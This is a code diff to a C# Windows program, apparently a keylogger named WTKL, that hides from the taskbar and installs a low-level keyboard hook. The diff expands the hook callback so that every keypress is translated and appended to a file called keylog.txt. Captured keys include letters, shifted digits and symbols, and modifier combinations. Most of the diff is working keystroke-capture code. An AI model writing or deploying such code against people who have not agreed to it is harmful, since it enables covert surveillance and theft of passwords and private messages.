@@ -32,18 +32,54 @@ namespace WTKL
         private const byte VK_CAPS = 20;
         private const byte VK_ESC = 27;
         private const byte VK_SPACE = 32;
-        private const byte VK_PAGEUP = 33;
-        private const byte VK_PAGEDOWN = 34;
+        private const byte VK_PAGE_UP = 33;
+        private const byte VK_PAGE_DOWN = 34;
         private const byte VK_END = 35;
         private const byte VK_HOME = 36;
-        private const byte VK_PRINTSCREEN = 44;
+        private const byte VK_ARROW_LEFT = 37;
+        private const byte VK_ARROW_UP = 38;
+        private const byte VK_ARROW_RIGHT = 39;
+        private const byte VK_ARROW_DOWN = 40;
+        private const byte VK_PRINT_SCREEN = 44;
         private const byte VK_INSERT = 45;
         private const byte VK_DELETE = 46;
         private const byte VK_LWINDOWS = 91;
         private const byte VK_RWINDOWS = 92;
         private const byte VK_NUMLOCK = 144;
+        private const byte VK_SCROLL_LOCK = 145;
+        private const byte VK_LEFT_SHIFT = 160;
+        private const byte VK_RIGHT_SHIFT = 161;
+        private const byte VK_LEFT_CONTROL = 162;
+        private const byte VK_RIGHT_CONTROL = 163;
+        private const byte VK_LEFT_MENU = 164;
+        private const byte VK_RIGHT_MENU = 165;
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+
+        private const string CTRL_STR = "CTRL";
+        private const string ALT_STR = "ALT";
+        private const string TAB_STR = "TAB";
+        private const string SHIFT_STR = "SHIFT";
+        private const string ENTER_STR = "ENTER";
+        private const string BACKSPACE_STR = "BKSPC";
+        private const string ESC_STR = "ESC";
+        private const string WINDOWS_STR = "WINDOWS";
+        private const string ARROW_UP_STR = "ARROWUP";
+        private const string ARROW_DOWN_STR = "ARROWDN";
+        private const string ARROW_LEFT_STR = "ARROWLT";
+        private const string ARROW_RIGHT_STR = "ARROWRT";
+        private const string INSERT_STR = "INSERT";
+        private const string DELETE_STR = "DELETE";
+        private const string HOME_STR = "HOME";
+        private const string END_STR = "END";
+        private const string PAGE_UP_STR = "PGUP";
+        private const string PAGE_DOWN_STR = "PGDN";
+        private const string PRINT_SCREEN_STR = "PRTSCRN";
+        private const string SCROLL_LOCK_STR = "SCRLLCK";
+        private const string NUM_LOCK_STR = "NUMLOCK";
+        private const string CAPS_LOCK_STR = "CAPSLOCK";
+        private const string SPACE_STR = "SPACE";
+
         private const string TEXT_FILE_NAME = "keylog.txt";
 
         private static LowLevelKeyboardProc _proc = HookCallback;
@@ -51,7 +87,8 @@ namespace WTKL
         private static bool logging = false;
         private static StreamWriter textFileWriter;
         private static byte[] keyStates = new byte[256];
-        
+        private static string[] keyStrings = new string[256];
+
         private NotifyIcon trayIcon;
         private ContextMenu trayMenu;
         private ServiceHost host;
@@ -80,10 +117,41 @@ namespace WTKL
             this.ShowInTaskbar = false;
 
             base.OnLoad(e);
+
+            SetKeyStringsArray();
+
             CreateOpenPipe();
 
             //For debugging only
             StartKeylogger();
+        }
+
+        private void SetKeyStringsArray()
+        {
+            keyStrings[VK_ARROW_DOWN] = ARROW_DOWN_STR;
+            keyStrings[VK_ARROW_LEFT] = ARROW_LEFT_STR;
+            keyStrings[VK_ARROW_RIGHT] = ARROW_RIGHT_STR;
+            keyStrings[VK_ARROW_UP] = ARROW_UP_STR;
+            keyStrings[VK_ALT] = ALT_STR;
+            keyStrings[VK_BACKSPACE] = BACKSPACE_STR;
+            keyStrings[VK_CAPS] = CAPS_LOCK_STR;
+            keyStrings[VK_CONTROL] = CTRL_STR;
+            keyStrings[VK_DELETE] = DELETE_STR;
+            keyStrings[VK_END] = END_STR;
+            keyStrings[VK_ENTER] = ENTER_STR;
+            keyStrings[VK_ESC] = ESC_STR;
+            keyStrings[VK_HOME] = HOME_STR;
+            keyStrings[VK_INSERT] = INSERT_STR;
+            keyStrings[VK_LWINDOWS] = WINDOWS_STR;
+            keyStrings[VK_NUMLOCK] = NUM_LOCK_STR;
+            keyStrings[VK_PAGE_DOWN] = PAGE_DOWN_STR;
+            keyStrings[VK_PAGE_UP] = PAGE_UP_STR;
+            keyStrings[VK_PRINT_SCREEN] = PRINT_SCREEN_STR;
+            keyStrings[VK_RWINDOWS] = WINDOWS_STR;
+            keyStrings[VK_SCROLL_LOCK] = SCROLL_LOCK_STR;
+            keyStrings[VK_SHIFT] = SHIFT_STR;
+            keyStrings[VK_SPACE] = SPACE_STR;
+            keyStrings[VK_TAB] = TAB_STR;
         }
 
         /* This is the method that is called just before the application stops running,
@@ -199,11 +267,11 @@ namespace WTKL
             keyStates[VK_CAPS] = ((GetKeyState(VK_CAPS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
             keyStates[VK_ESC] = ((GetKeyState(VK_ESC) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
             keyStates[VK_SPACE] = ((GetKeyState(VK_SPACE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
-            keyStates[VK_PAGEUP] = ((GetKeyState(VK_PAGEUP) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
-            keyStates[VK_PAGEDOWN] = ((GetKeyState(VK_PAGEDOWN) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_PAGE_UP] = ((GetKeyState(VK_PAGE_UP) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_PAGE_DOWN] = ((GetKeyState(VK_PAGE_DOWN) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
             keyStates[VK_END] = ((GetKeyState(VK_END) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
             keyStates[VK_HOME] = ((GetKeyState(VK_HOME) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
-            keyStates[VK_PRINTSCREEN] = ((GetKeyState(VK_PRINTSCREEN) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
+            keyStates[VK_PRINT_SCREEN] = ((GetKeyState(VK_PRINT_SCREEN) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
             keyStates[VK_INSERT] = ((GetKeyState(VK_INSERT) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
             keyStates[VK_DELETE] = ((GetKeyState(VK_DELETE) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
             keyStates[VK_LWINDOWS] = ((GetKeyState(VK_LWINDOWS) & 0x8000) != 0 ? (byte)0x01 : (byte)0x00);
@@ -217,13 +285,186 @@ namespace WTKL
          */
         private static IntPtr HookCallback(int nCode, IntPtr wParam, ref keyboardHookStruct lParam)
         {
-            //todo figure out how to edit this keylogging code
+            string output = "";
+            bool firstKey = true;
+            byte[] keyboardArray = new byte[256];
+
+
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                KeyStateHelper();
-                byte[] asciiConvertBuffer = new byte[2];
-                byte[] keyboardArray = new byte[256];
-                if(ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
+                //KeyStateHelper();
+                //vk = 110 for numpad period
+                //vk = 190 for regular period
+                GetKeyState(0);
+                GetKeyboardState(keyboardArray);
+
+                //Logical OR the left and right keys with the regular key
+                keyboardArray[VK_SHIFT] = (byte)(keyboardArray[VK_SHIFT] | keyboardArray[VK_LEFT_SHIFT] |
+                    keyboardArray[VK_RIGHT_SHIFT]);
+
+                keyboardArray[VK_CONTROL] = (byte)(keyboardArray[VK_CONTROL] | keyboardArray[VK_LEFT_CONTROL] |
+                    keyboardArray[VK_RIGHT_CONTROL]);
+
+                for (int i = 0; i < keyboardArray.Length; i++)
+                {
+                    if ((keyboardArray[i] & 0x80) != 0)
+                    {
+                        /*if (lParam.vkCode == i)
+                        {
+                            output = output + " + " + keyStrings[i];
+                        }*/
+                        if (firstKey)
+                        {
+                            output += keyStrings[i];
+                            firstKey = false;
+                        }
+                        else
+                        {
+                            output += " + " + keyStrings[i];
+                        }
+                    }
+                    if(lParam.vkCode == i)
+                    {
+                        if (firstKey)
+                        {
+                            output += keyStrings[i];
+                            firstKey = false;
+                        }
+                        else
+                        {
+                            output += " + " + keyStrings[i];
+                        }
+                    }
+                }
+
+                //If keycode is between a and z
+                if (lParam.vkCode >= 65 && lParam.vkCode <= 90)
+                {
+                    byte[] asciiConvertBuffer = new byte[2];
+                    if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
+                    {
+                        char key = (char)asciiConvertBuffer[0];   
+                        if ((keyboardArray[VK_SHIFT] & 0x80) != 0 ^ (keyboardArray[VK_CAPS] & 0x01) != 0)
+                        {
+                            key = Char.ToUpper(key);
+                        }
+                        else
+                        {
+                            key = Char.ToLower(key);
+                        }
+                        output += key.ToString();
+                    }
+                }
+
+                //If keycode is between numpad 0 and numpad 9
+                if (lParam.vkCode >= 96 && lParam.vkCode <= 105)
+                {
+                    if ((keyboardArray[VK_NUMLOCK] & 0x01) != 0)
+                    {
+                        char key;
+                        byte[] asciiConvertBuffer = new byte[2];
+                        if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
+                        {
+                            key = (char)asciiConvertBuffer[0];
+                            output += key.ToString();
+                        }
+                    }
+                }
+
+                //If keycode is a regular keyboard number
+                if (lParam.vkCode >= 48 && lParam.vkCode <= 57)
+                {
+                    if ((keyboardArray[VK_SHIFT] & 0x80) != 0)
+                    {
+                        switch (lParam.vkCode)
+                        {
+                            case 48: //0 key
+                                output += ")";
+                                break;
+                            case 49: //1 key
+                                output += "!";
+                                break;
+                            case 50: //2 key
+                                output += "@";
+                                break;
+                            case 51: //3 key
+                                output += "#";
+                                break;
+                            case 52: //4 key
+                                output += "$";
+                                break;
+                            case 53: //5 key
+                                output += "%";
+                                break;
+                            case 54: //6 key
+                                output += "^";
+                                break;
+                            case 55: //7 key
+                                output += "&";
+                                break;
+                            case 56: //8 key
+                                output += "*";
+                                break;
+                            case 57: //9 key
+                                output += "(";
+                                break;
+                        }
+                    }
+                    else
+                    {
+                        byte[] asciiConvertBuffer = new byte[2];
+                        if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
+                        {
+                            char key = (char)asciiConvertBuffer[0];
+                            output += key.ToString();
+                        }
+                    }
+                }
+
+                //Capture "OEM" and arithmetic keyboard keys
+                if ((lParam.vkCode >= 186 && lParam.vkCode <= 191) ||
+                    (lParam.vkCode >= 219 && lParam.vkCode <= 223) ||
+                    (lParam.vkCode >= 106 && lParam.vkCode <= 111) ||
+                    (lParam.vkCode == 192))
+                {
+                    byte[] asciiConvertBuffer = new byte[2];
+                    if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
+                    {
+                        char key = (char)asciiConvertBuffer[0];
+                        output += key.ToString();
+                    }
+                }
+
+                
+
+                /*for (int i = 0; i < keyStates.Length; i++)
+                {
+                    if (keyStates[i] == 0x01)
+                    {
+                        if (!firstKey)
+                        {
+                            output = output + " + ";
+                        }
+                        else
+                        {
+                            output = output + keyStrings[i];
+                        }
+                        if (firstKey)
+                        {
+                            firstKey = false;
+                        }
+                    }
+                }
+                if (output == SHIFT_STR)
+                {
+                    output = "";
+                    firstKey = true;
+                }*/
+
+                //byte[] asciiConvertBuffer = new byte[2];
+                //byte[] keyboardArray = new byte[256];
+                //If letter or number
+                /*if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
                 {
                     char key = (char)asciiConvertBuffer[0];
                     if ((GetKeyState(VK_CONTROL) & 0x8000) == 0)
@@ -241,18 +482,29 @@ namespace WTKL
                                 key = Char.ToLower(key);
                             }
                         }
-                        textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
-                        textFileWriter.Write(key);
-                        textFileWriter.Close();
+
+                    }
+                    if (!firstKey)
+                    {
+                        output = output + key;
                     }
                     else
                     {
-
+                        output = key.ToString();
                     }
+                }*/
+
+                if (output.Length > 1)
+                {
+                    output = "[" + output + "]";
                 }
+                textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
+                textFileWriter.Write(output);
+                textFileWriter.Close();
+
                 //int vkCode = Marshal.ReadInt32(lParam);
                 //char key = (char)vkCode;
-                
+
                 //int vkCode = Marshal.ReadInt32(lParam);
                 //textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
                 //textFileWriter.Write((Keys)vkCode);
@@ -280,7 +532,10 @@ namespace WTKL
          *******************************************************************************/
         [DllImport("User32.dll", CharSet = CharSet.Auto)]
         private static extern int ToAscii(int keyCode, int scanCode, byte[] keyboardBuffer, byte[] translateBuffer, int flags);
-        
+
+        [DllImport("User32.dll", CharSet = CharSet.Auto)]
+        private static extern bool GetKeyboardState(byte[] keyboardBuffer);
+
         [DllImport("User32.dll", CharSet = CharSet.Auto)]
         private static extern short GetKeyState(int virtualKeyCode);
 
